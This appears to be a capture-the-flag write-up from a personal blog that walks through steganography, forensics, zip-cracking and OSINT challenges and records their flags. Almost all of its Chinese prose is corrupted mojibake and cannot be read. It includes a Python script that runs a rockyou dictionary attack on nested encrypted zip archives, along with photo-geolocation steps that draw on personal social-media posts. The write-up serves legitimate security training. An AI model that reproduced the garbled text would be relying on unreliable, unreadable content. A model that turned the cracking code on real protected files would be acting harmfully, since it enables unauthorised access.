å›¾ç‰‡ï¼š é¦–å…ˆç”¨010 Editoræ‰“å¼€ç¬¬ä¸€å¼ å›¾ç‰‡ä¼šå‘ç° åœ¨Descriptionåé¢æœ‰ä¸€æ®µbase64ç¼–ç  1UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0= è§£ç åä¼šå¾—åˆ° 1RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM= å†è§£ç ä¸€æ¬¡ä¼šå¾—åˆ°key1ï¼š 1234FÃ©licitations ! Tu as trouvÃ© la clÃ© nÂ°1 du coffre !Congratulations ! You found the key nÂ°1 of the chest !ClÃ©: M3t4d4t4_15_n0t_5af3Key: M3t4d4t4_15_n0t_5af3 å› ä¸ºhexæ–‡ä»¶é‡Œé¢çœ‹èµ·æ¥æ‰¾ä¸åˆ°ç¬¬äºŒæ®µkeyäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨Stegsolve.jaræ‰“å¼€è¿™å¼ å›¾ç‰‡æŸ¥çœ‹æ˜¯å¦æœ‰ç”¨LSBéšå†™çš„å†…å®¹ã€‚å½“è°ƒæ•´åˆ°Red Plane 0æ—¶ä¼šå¾—åˆ° æˆ‘ä»¬å°†è¿™å¼ ç…§ç‰‡å¯¼å‡ºä¼šå¾—åˆ°ç¬¬äºŒéƒ¨åˆ†çš„keyï¼ˆkey2ï¼‰ï¼š 123key1: M3t4d4t4_15_n0t_5af3key2: Hidd3n_p1ctur3key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3 ç„¶åæˆ‘ä»¬ç°åœ¨æ¥æ‰“å¼€ç®±å­ï¼šæ ¹æ®æç¤ºï¼Œæ”¯æŒåŠ å¯†éšå†™å¹¶ä¸”æœ‰GUIçš„è½¯ä»¶å¹¶ä¸å¤šï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹OpenStegoï¼š æå–å‡ºæ¥çš„ç…§ç‰‡ä¸ºï¼š æˆåŠŸæ‰¾åˆ°flagï¼š 1ECTF&#123;You_found_th3_tr3asur3&#125; Silhouette in cyberpunk è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼š éå¸¸èµ›åšé£ã€‚ æ³¨æ„åˆ°è¿™ä¸¤ä¸ªåœ°æ–¹çš„ç‚¹ç»„çš„æ’åˆ—éå¸¸åƒæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼ˆæ¯”å¦‚è¯´ç”µæ¢¯é‡Œï¼‰ä¼šç¢°åˆ°çš„ç›²æ–‡ï¼š ï¼ˆè¿‘ç‚¹çš„é‚£æ ‹å¤§æ¥¼ï¼‰ ï¼ˆç”»é¢å·¦è¾¹è¿œå¤„çš„é‚£æ ‹å¤§æ¥¼ï¼‰ ç¬¬ä¸€å¼ é‡Œé¢çš„ç›²æ–‡ç¿»è¯‘è¿‡æ¥æ˜¯ï¼š 1This is just a dummyy, nice try è€Œç¬¬äºŒå¼ é‡Œé¢çš„å†…å®¹æ‰æ˜¯çœŸæ­£çš„flagï¼š 12345â “â ¼â â ™â ™â ¼â ‰â â ¼â â â ¹â ¼â ‰â ™â ¼â ™â —â …â â ¼â ‰â â -&gt;h1dd3n1nth3d4rkn3ss (å¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™ç¿»è¯‘ç›²æ–‡å†…å®¹ï¼šhttps://www.dcode.fr/alphabet-braille) æ ¹æ®é¢˜ç›®çš„flagæ ¼å¼è¦æ±‚ï¼Œæˆ‘ä»¬ç¡®å®šflagä¸ºï¼š 1ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125; 4. MiscellaneousExtraction Mission Heart of the vault è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…Misc_5_-_dwarf_vault_200.zipï¼Œå°†å…¶çˆ†ç ´ä¹‹åä¼šå†æ¬¡å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…dwarf_vault_199.zipï¼Œå†é‡å¤ä¸€æ¬¡æ“ä½œä¼šå¾—åˆ°dwarf_vault_198.zipï¼Œä¹Ÿæ˜¯åŠ å¯†äº†çš„ã€‚æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹ä½œè€…å°†ä¸€ä»½æ–‡ä»¶ï¼ˆå¤¹ï¼‰é‡å¤åŠ å¯†å‹ç¼©äº†200æ¬¡ã€‚æ‰€ä»¥å†³å®šå†™ä¸€ä¸ªè„šæœ¬è‡ªåŠ¨åŒ–å®Œæˆè¿™äº›æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®æç¤ºå°†æ‰€æœ‰å¯†ç ä¿å­˜è¿›ä¸€ä¸ªtxtæ–‡ä»¶é‡Œï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import zipfileimport osimport shutilimport zlib# å®šä¹‰åˆå§‹zipæ–‡ä»¶è·¯å¾„å’Œå­—å…¸æ–‡ä»¶è·¯å¾„zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;dict_path = &quot;rockyou.txt&quot;passwords = [] # è®°å½•æ‰€æœ‰æ‰¾åˆ°çš„å¯†ç def brute_force_zip(zip_path, dict_path): try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_file: with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f: for line in f: password = line.strip().encode(&quot;latin-1&quot;) # è½¬æ¢ä¸ºå­—èŠ‚æ ¼å¼ try: zip_file.extractall(pwd=password) print(f&quot;[+] æ‰¾åˆ°å¯†ç : &#123;password.decode()&#125;&quot;) passwords.append(password.decode()) # è·å–è§£å‹åçš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶å extracted_files = zip_file.namelist() return extracted_files # è¿”å›è§£å‹å‡ºçš„æ–‡ä»¶ååˆ—è¡¨ except (RuntimeError, zipfile.BadZipFile, zlib.error): continue print(&quot;[-] æœªæ‰¾åˆ°å¯†ç ï¼Œè¯·å°è¯•å…¶ä»–å­—å…¸æˆ–æ–¹æ³•ã€‚&quot;) return None except FileNotFoundError: print(&quot;[!] æ–‡ä»¶æœªæ‰¾åˆ°ï¼Œè¯·æ£€æŸ¥è·¯å¾„æ˜¯å¦æ­£ç¡®ã€‚&quot;) return None except zlib.error: print(&quot;[!] é‡åˆ° zlib è§£å‹é”™è¯¯ï¼Œç»ˆæ­¢çˆ†ç ´ã€‚&quot;) return None# é€’å½’è§£å‹ç›´åˆ°æ²¡æœ‰æ›´å¤š zip æ–‡ä»¶def recursive_brute_force(zip_path, dict_path): try: while zip_path: extracted_files = brute_force_zip(zip_path, dict_path) if not extracted_files: break # æŸ¥æ‰¾æ–°çš„ ZIP æ–‡ä»¶ new_zip_path = None for file in extracted_files: if file.endswith(&quot;.zip&quot;): new_zip_path = file break if new_zip_path: zip_path = new_zip_path # ç›´æ¥ä½¿ç”¨æ–°æ‰¾åˆ°çš„ ZIP æ–‡ä»¶ else: print(&quot;[!] æ²¡æœ‰æ‰¾åˆ°æ›´å¤šçš„ ZIP æ–‡ä»¶ï¼Œä»»åŠ¡å®Œæˆï¼&quot;) break except zlib.error: print(&quot;[!] å‘ç”Ÿ zlib é”™è¯¯ï¼Œç»ˆæ­¢çˆ†ç ´ã€‚&quot;) finally: # å°†æ‰€æœ‰æ‰¾åˆ°çš„å¯†ç å†™å…¥æ–‡ä»¶ with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: for password in passwords: f.write(password + &quot;\\n&quot;)# è¿è¡Œçˆ†ç ´å‡½æ•°recursive_brute_force(zip_path, dict_path)print(&quot;æ‰€æœ‰æ‰¾åˆ°çš„å¯†ç :&quot;, passwords) æ³¨æ„ï¼Œçˆ†ç ´åˆ°dwarf_vault_1.zipç»å¸¸ä¼šè¿”å›å¥‡æ€ªçš„ERRORï¼Œæ‰€ä»¥è¿™é‡Œçš„ä»£ç é€»è¾‘æœ€å¥½æ˜¯åœ¨é‡åˆ°æ„å¤–ERRORæ—¶ç›´æ¥ç»ˆæ­¢çˆ†ç ´å¹¶å°†ç°æœ‰çš„æ‰€æœ‰å¯†ç å…ˆå†™è¿›txtæ–‡ä»¶ï¼Œä¸ç„¶å®¹æ˜“å¡åœ¨è¿™é‡Œé‡å¤å¾ˆå¤šæ¬¡ã€‚ å†æˆåŠŸè§£å‹dwarf_vault_1.zipåï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°2ä»½æ–‡ä»¶ï¼šdrop_pod.pyä»¥åŠmining_report.txtã€‚ txtæ–‡ä»¶çš„å†…å®¹ä¸ºï¼š 1Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125; ç”¨coordinateå°†flagè¡¨ç¤ºäº†å‡ºæ¥ã€‚äºæ˜¯æ¥æ£€æŸ¥drop_pod.pyçš„å†…å®¹ï¼š 12345678910111213141516171819202122232425262728293031323334#Maybe the flag was the friends we made along the waypassword = &quot; &quot;flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;def find_positions(flag, crew_list): positions = [] for char in flag: if char == &quot;_&quot;: positions.append(&quot;_&quot;) continue found = False for i, name in enumerate(crew_list): if char.lower() in name.lower(): positions.append([i, name.lower().index(char.lower())]) found = True break if not found: positions.append([None, None]) return positionspositions = find_positions(flag, password.split())output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file: file.write(output_text)print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text) æ˜¯è¿™æ®µåæ ‡çš„ç”Ÿæˆé€»è¾‘ã€‚æ‰€ä»¥å¯ä»¥ç¼–å†™ä¸€æ®µä»£ç ï¼Œé æˆ‘ä»¬åˆšæ‰ä¿å­˜çš„æ‰€æœ‰å‹ç¼©å¯†ç æ¥è¿˜åŸflagï¼š 123456789101112131415161718192021222324252627with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file: reversed_passwords = file.readlines()# å»é™¤æ¢è¡Œç¬¦å¹¶åè½¬åˆ—è¡¨ï¼ˆå› ä¸ºæˆ‘ä»¬çˆ†ç ´æ—¶æ˜¯ä»200å¼€å§‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åè¿‡æ¥ï¼‰password_list = [line.strip() for line in reversed_passwords][::-1]#txté‡Œçš„å†…å®¹positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]# è¿˜åŸ flagflag = &quot;&quot;for pos in positions: if pos == &quot;_&quot;: flag += &quot;_&quot; else: i, j = pos if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]): flag += password_list[i][j] else: flag += &quot;?&quot; # æ ‡è®°é”™è¯¯æˆ–ç¼ºå¤±æ•°æ®# è¾“å‡ºç»“æœprint(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125; 5. ForensicMy dearest æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä»½docxæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯wordæ–‡ä»¶ã€‚æ‰“å¼€ååœ¨ä¿¡æ¯çš„ä½œè€…å¤„å³å¯æ‰¾åˆ°æ–‡ä»¶ä½œè€…ï¼š æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œflagä¸ºï¼š 1ectf&#123;MichelTeller&#125; Capture the hidden è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä»½.pcapæ–‡ä»¶ï¼Œç”¨Wiresharkæ‰“å¼€å®ƒã€‚ ç”±äºæ˜¯è¦æ‰¾ä¸€ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆç‚¹å‡»â€œæ–‡ä»¶â€ -&gt; â€œå¯¼å‡ºå¯¹è±¡â€ -&gt; â€œHTTPâ€ï¼š ç¡®å®å‘ç°äº†ä¸€ä»½ä¸Šä¼ çš„æ–‡ä»¶ã€‚å¯ä»¥ç‚¹å‡»ä¿å­˜å®ƒï¼Œä½†æ˜¯æ‰“å¼€ä¼šå‘ç°å†…å®¹ä¸ä¸å®Œæ•´ï¼š 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1N äºæ˜¯æˆ‘ä»¬æ‰¾è¿™ä»½æ–‡ä»¶åœ¨çºªå½•é‡Œçš„å…·ä½“ä½ç½®ï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¿å­˜çš„uploadçš„æ–‡ä»¶å†…å®¹åªæœ‰è“è‰²éƒ¨åˆ†ï¼Œå½“æˆ‘ä»¬å°†åç»­çš„å†…å®¹ä¹Ÿæå‡ºæ¥ï¼Œä¾¿ä¼šå¾—åˆ°å®Œæ•´çš„flagï¼š 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125; Just a PCAP è¿™é“é¢˜ä¹Ÿæ˜¯ä¸€ä»½pcapæ–‡ä»¶ï¼Œå†æ¬¡ç”¨Wiresharkæ‰“å¼€ã€‚ ä½†æ˜¯ç”¨ä¹‹å‰çš„æ“ä½œï¼šâ€œæ–‡ä»¶â€ -&gt; â€œå¯¼å‡ºå¯¹è±¡â€ -&gt; â€œHTTPâ€ï¼Œå¹¶ä¸ä¼šå‘ç°ä»»ä½•ä¸œè¥¿ã€‚ï¼ˆå®é™…ä¸Šæ˜¯å› ä¸ºè¿™æ®µçºªå½•é‡Œå¹¶æ²¡æœ‰ä»»ä½•HTTPä¼ è¾“çš„å†…å®¹ã€‚ï¼‰ è¿™æ—¶æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿç¬¬ä¸€æ¡çºªå½•çš„infoä¼šå‘ç°å®ƒæ˜¯ä»¥â€89504E47â€œï¼Œè¿™æ˜¯éå¸¸å…¸å‹çš„PNGæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼ˆå› ä¸ºå®ƒå¯¹åº”ASCIIå­—ç¬¦â€œâ€°PNGâ€ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬çŒœæµ‹è¿™äº›çºªå½•çš„infoå†…å®¹å¯ä»¥æ‹¼æˆä¸€ä»½å®Œæ•´çš„PNGæ–‡ä»¶ã€‚æˆ‘ä»¬ç”¨è¿™æ®µä»£ç å°†æ‰€æœ‰çºªå½•çš„infoå†…å®¹æå–å‡ºæ¥å¹¶ä¸”ä¿å­˜æˆ.pngï¼šï¼ˆè¿™æ®µä»£ç èƒ½è¿è¡Œçš„å‰ææ¡ä»¶æ˜¯ä¸‹è½½äº†Wireshark\\çš„tshark.exe 123456789101112131415import pysharkimport pyshark.packetfrom binascii import unhexlifycapture = pyshark.FileCapture(&#x27;justapcap.pcap&#x27;, tshark_path=&#x27;D:\\\\Program Files\\\\Wireshark\\\\tshark.exe&#x27;) # å°†è¿™ä¸ªè·¯å¾„æ›¿æ¢æˆè‡ªå·±ç”µè„‘ä¸Štshark.exeçš„è·¯å¾„hexstr = &quot;&quot;cnt = 0for packet in capture: s = str(packet) cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1] hexstr += curhexstr = hexstr.split(&quot;exam&quot;)[0]with open(&quot;a.png&quot;,&quot;wb&quot;) as f: f.write(unhexlify(hexstr)) ç„¶åå°±ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š 1ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125; 6. OsintProject-153-Q1 è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š é€šè¿‡è°·æ­Œè¯†å›¾å¯ä»¥å¾ˆè½»æ˜“åœ°çŸ¥é“è¿™ä¸ªåœ°æ–¹æ˜¯ï¼šFalls Caramy, æ³•è¯­åŸåä¸ºChutes_du_Caramyã€‚ å¾—åˆ°flagï¼š 1ectf&#123;Chutes_du_Caramy&#125; Project-153-Q2 è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š é€šè¿‡è°·æ­Œè¯†å›¾å¯ä»¥åˆ¤æ–­å‡ºæ¥è¿™å¼ ç…§ç‰‡æ˜¯åœ¨ Massif de lâ€™Esterel é™„è¿‘æ‹æ‘„çš„ã€‚ ä½†ç”±äºé¢˜ç›®è¦æ±‚çš„æ˜¯æ‹æ‘„æ—¶æ‰€å¤„çš„å…·ä½“ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾äº›å…¶ä»–çš„çº¿ç´¢ã€‚ æ³¨æ„åˆ°å›¾ç‰‡è¿œå¤„è¿™é‡Œï¼Œæœ‰ä¸€åº§å…¨æ˜¯æˆ¿å­çš„åŠå²›ï¼š äºæ˜¯æˆ‘ä»¬æ‰“å¼€Google Earthï¼ŒæŸ¥çœ‹Massif de lâ€™Esterelé™„è¿‘çš„æµ·å²¸çº¿ã€‚å¯ä»¥å‘ç°è¿™ä¸ªåœ°æ–¹éå¸¸æƒ³å›¾ä¸­çš„åŠå²›ï¼š å¹¶ä¸”ç‚¹å¼€ Calanque de lâ€™Esterel, 83700 Saint-RaphaÃ«l, æ³•å›½ çš„ç›¸å†Œå¯ä»¥çœ‹åˆ°è¿™æ ·ä¸€å¼ å›¾ç‰‡ï¼š è·Ÿæˆ‘ä»¬å›¾ç‰‡é‡Œçš„ä¸€æ¨¡ä¸€æ ·ã€‚æ²¿ç€è¿™ä¸ªæ–¹å‘ä¾æ¬¡å°è¯•å¸¦æœ‰åå­—çš„åœ°ç‚¹ï¼Œä¾¿å¯ä»¥æˆåŠŸæ‰¾åˆ°æ‹æ‘„åœ°ï¼šPointe de lâ€™Observatoire, D559, 83700 Saint-RaphaÃ«l, æ³•å›½ã€‚ 1ectf&#123;Pointe_de_l&#x27;Observatoire&#125; Project-153-Q3 è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š å†æ¬¡é€šè¿‡è°·æ­Œè¯†å›¾å¯ä»¥å‘ç°å›¾ç‰‡æ‰€åœ¨åœ°æ˜¯ Rocher de Roquebruneï¼š åœ¨Google Earthæ‰¾åˆ°è¿™é‡Œ ä¾¿å¯ä»¥åœ¨ç›¸å†Œé‡Œå‘ç°è¿™å¼ å›¾ç‰‡ï¼Œå¤§æ¦‚ç‡æ˜¯é¢˜ç›®æ‰€æŒ‡çš„â€œmonsterï¼š æ‰€ä»¥ç­”æ¡ˆä¸ºå·¦ä¸‹è§’çš„ä½œè€…åå­—ã€‚ 1ectf&#123;Michael_DELAETER&#125; Project-153-Q4 é¦–å…ˆé€šè¿‡è°·æ­Œè¯†å›¾åˆ¤æ–­å‡ºç…§ç‰‡æ‰€åœ¨åœ°åº”è¯¥æ˜¯ï¼šBormes-les-Mimosas åœ¨Google Earthæ‰¾åˆ°è¿™é‡Œï¼š æ ¹æ®ç…§ç‰‡æ‹æ‘„è§’åº¦ä»¥åŠé¢˜ç›®æè¿°ä¸éš¾çŒœå‡ºè¿œå¤„çš„é‚£åº§å²›åº”è¯¥æ˜¯ Ãle du Levantã€‚ 1ectf&#123;Ãle_du_Levant&#125; Project-153-Q5 è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š /OSINT_1_-_question-5/PANO_20220408_134922.jpg) è¿™é“é¢˜ä¼šç¢°åˆ°ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„äº‹æƒ…ã€‚æˆ‘ä»¬æ‹¿åˆ°çš„å›¾ç‰‡çš„æ–‡ä»¶å¤§å°ä¸º29.8 MBï¼Œè€Œè°·æ­Œè¯†å›¾çš„ä¸Šé™ä¸º20MBï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦å‹ç¼©ä¸€ä¸‹å›¾ç‰‡çš„å¤§å°æ‰èƒ½ä½¿ç”¨è°·æ­Œè¯†å›¾ã€‚æˆ‘è¿™é‡Œæ˜¯ç”¨å¾®ä¿¡æ¥è¿›è¡Œæœ‰æŸå‹ç¼©çš„ã€‚ ç„¶åä¾¿å¯ä»¥ç”¨è°·æ­Œè¯†å›¾æ¥ç¡®è®¤åœ°ç‚¹ï¼š 1ectf&#123;Gros_Cerveau&#125; (åœ¨æ³•è¯­ä¸­ï¼Œâ€œleâ€ æ˜¯é˜³æ€§å•æ•°å®šå† è¯ï¼Œæ‰€ä»¥ä¸åŒ…å«åœ¨ç­”æ¡ˆå†…ã€‚) Project-153-Q6 è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š å†æ¬¡é€šè¿‡è°·æ­Œè¯†å›¾æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™æ ·ä¸€æ¡Instergramï¼š ï¼ˆä¸ºäº†é˜²æ­¢ä¾µçŠ¯ä¸ªäººéšç§æˆ‘ç»™å›¾ç‰‡æ‰“äº†ä¸ªç ã€‚ï¼‰ äºæ˜¯å¯ä»¥å¾—çŸ¥è¿™å¼ ç…§ç‰‡çš„æ‹æ‘„æ‰€åœ¨åœ°ä¸º Moustiers-Sainte-Marie ï¼ˆzipcodeï¼š04360ï¼‰ã€‚ è‡³äºå°é˜¶æ•°å¯ä»¥ç›´æ¥åˆ©ç”¨å¼€äº†è”ç½‘åŠŸèƒ½çš„ChatGPTæ‰€æœå³å¯ï¼š æœ€åçš„flagä¸ºï¼š 1ectf&#123;262_04360&#125; PNJ - 3 - Gouzou è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰éå¸¸å¤šçš„æ–‡ä»¶ï¼Œå®ƒè¯´çš„è¿™ä¸ªâ€œtheâ€å±å®æ˜¯æœ‰ç‚¹æ„ä¹‰ä¸æ˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå»æœç´¢çœ‹ä¸€ä¸‹GOUZOUæ˜¯ä»€ä¹ˆï¼š å‘ç°æ˜¯æ³•å›½è‰ºæœ¯å®¶JACEåˆ›ä½œä¸€ä¸ªæ²¡æœ‰äº”å®˜çš„è¯™è°å¡é€šå½¢è±¡ã€‚æ ¹æ®è¿™æ¡çº¿ç´¢æˆ‘ä»¬å¯ä»¥é”å®šè¿™å¼ å›¾ç‰‡ï¼ˆä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦æ‰¾çš„åº”è¯¥æ˜¯è¿™å¼ å›¾ç‰‡çš„å…·ä½“ä½ç½®ï¼‰ï¼š æ ¹æ®è°·æ­Œè¯†å›¾å¯ä»¥å‘ç°è¿™å¼ ç…§ç‰‡åœ¨ â€œÃle de RÃ©â€ï¼ˆé›·å²›ï¼‰ï¼š é€šè¿‡æœç´¢â€œÃ®le de rÃ© gouzouâ€å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç½‘é¡µï¼šhttps://www.realahune.fr/les-murs-dexpression-de-latlantique/ï¼Œå¹¶ä¸”å‘ç°ï¼š äºæ˜¯æˆ‘ä»¬ç¡®å®šè¿™å¹…ç”»æ˜¯åœ¨â€la digue du Boutillon, Ã®le de RÃ©â€(æ˜¯ä¸€åº§é˜²æ³¢å ¤)ï¼Œå¾—åˆ°flagï¼š 1ectf&#123;digue_du_boutillon&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"},{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"ç»Ÿè®¡ Statistics","slug":"TUM-æ•°å­¦-ç¬”è®°/ç»Ÿè®¡-Statistics","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E7%BB%9F%E8%AE%A1-Statistics/"},{"name":"Machine Learning æœºå™¨å­¦ä¹ ","slug":"TUM-æ•°å­¦-ç¬”è®°/Machine-Learning-æœºå™¨å­¦ä¹ ","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Machine-Learning-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Data Engeneering","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/Data-Engeneering","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Data-Engeneering/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"},{"name":"æ‚","slug":"æ‚","permalink":"https://archer-baiyi.github.io/categories/%E6%9D%82/"},{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://archer-baiyi.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"},{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"},{"name":"Stochastic Analysis éšæœºåˆ†æ","slug":"TUM-æ•°å­¦-ç¬”è®°/Stochastic-Analysis-éšæœºåˆ†æ","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Stochastic-Analysis-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/categories/CTF/General/"},{"name":"P-adic Numbers and Hensels Lemma","slug":"TUM-æ•°å­¦-ç¬”è®°/P-adic-Numbers-and-Hensels-Lemma","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/P-adic-Numbers-and-Hensels-Lemma/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"},{"name":"Coding Theory ç¼–ç ç†è®º","slug":"TUM-æ•°å­¦-ç¬”è®°/Coding-Theory-ç¼–ç ç†è®º","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Coding-Theory-%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"},{"name":"æ¦‚ç‡è®º Probability Theory","slug":"TUM-æ•°å­¦-ç¬”è®°/æ¦‚ç‡è®º-Probability-Theory","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/"},{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"},{"name":"Theoretische Informatik 